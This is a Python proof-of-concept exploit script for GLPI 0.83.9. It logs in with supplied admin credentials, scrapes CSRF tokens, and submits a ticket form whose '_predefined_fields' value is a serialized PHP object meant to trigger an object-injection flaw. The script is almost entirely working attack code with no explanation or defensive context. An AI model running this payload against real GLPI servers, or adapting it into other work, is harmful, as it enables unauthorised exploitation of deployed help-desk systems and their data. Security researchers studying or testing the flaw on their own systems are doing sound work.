# GLPI (0.83.9) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup
import random

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [ADMINID] [ADMINPW]")
    exit()

def login(baseurl, adminid, adminpw):
    URL = "{}{}".format(baseurl, "/login.php")
    with requests.Session() as session:
        csrf_req = session.get(baseurl)
        soup = BeautifulSoup(csrf_req.text, features="html.parser")
        csrf_token = soup.find("input", {"name": "_glpi_csrf_token"})['value']

        login_data = {
                '_glpi_csrf_token': csrf_token,
                "login_name": adminid,
                "login_password": adminpw,
                "submit": "Post"
                }
        header = {
                "Referer": "{}{}".format(baseurl, "/index.php")
                }
        r = session.post(URL, data = login_data, headers = header)
        if(r.text.find("Incorrect username or password") > -1):
            print("[!] Login Failed!");
            exit()
        else:
            return session

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 4):
    printUsageAndExit()

BASEURL = sys.argv[1]
ADMINID = sys.argv[2]
ADMINPW = sys.argv[3]

# Get token
session = login(BASEURL, ADMINID, ADMINPW)
token_req = session.get("{}{}".format(BASEURL, "/front/ticket.form.php"))
soup = BeautifulSoup(token_req.text, features="html.parser")
token = soup.find("input", {"name": "_glpi_csrf_token"})['value']

MONTH = "{}".format(random.randint(1,30)).rjust(2, "0")
DAY = "{}".format(random.randint(1,28)).rjust(2, "0")

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'
PAYLOAD = {
    "date": (None, "2020-{}-{} 15:08:00".format(MONTH, DAY)),
    "due_date": (None, "NULL"),
    "slas_id": (None, "0"),
    "type": (None, "1"),
    "itilcategories_id": (None, "0"),
    "_users_id_requester": (None, "5"), # I think, this argument need to be changed.
    "entities_id": (None, "0"),
    "_groups_id_requester": (None, "0"),
    "_users_id_observer": (None, "0"),
    "_groups_id_observer": (None, "0"),
    "_users_id_assign": (None, "2"),
    "_groups_id_assign": (None, "0"),
    "suppliers_id_assign": (None, "0"),
    "status": (None, "new"),
    "requesttypes_id": (None, "1"),
    "urgency": (None, "3"),
    "_add_validation": (None, "0"),
    "impact": (None, "3"),
    "_my_items": (None, ""),
    "itemtype": (None, ""),
    "priority": (None, "3"),
    "actiontime": (None, "0"),
    "name": (None, ""),
    "content": (None, ""),
    "filename[]": (None, ""),
    "_link[link]": (None, "1"),
    "_link[tickets_id_1]": (None, "0"),
    "_link[tickets_id_2]": (None, ""),
    "_tickettemplates_id": (None, "1"),
    "_predefined_fields": (None, TRIGGER_INPUT),
    "id": (None, "0"),
    "_glpi_csrf_token": (None, token)
}

header = {
        "Referer": "{}{}".format(BASEURL, "/front/ticket.form.php")
        }

# Submit PAYLOAD
poc_req = session.post("{}{}".format(BASEURL, "/front/ticket.form.php"),
                        headers = header, files = PAYLOAD)

# print(poc_req.text)
